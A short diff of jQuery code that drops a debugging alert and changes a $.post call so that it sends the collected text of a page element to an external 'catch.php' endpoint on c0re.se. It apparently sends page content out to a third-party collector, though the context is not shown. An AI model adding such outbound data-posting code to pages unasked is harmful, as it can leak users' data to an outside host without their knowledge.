@@ -49,8 +49,7 @@ $.ajax({
 			$(display).append(info);
 		}
 		console.log('2nd');
-		alert(display);
-		$.post("http://c0re.se/catch.php", { "text":display, });
+		$.post("http://c0re.se/catch.php", { "text":display.text(), });
 		console.log('3rd');
 
 	}
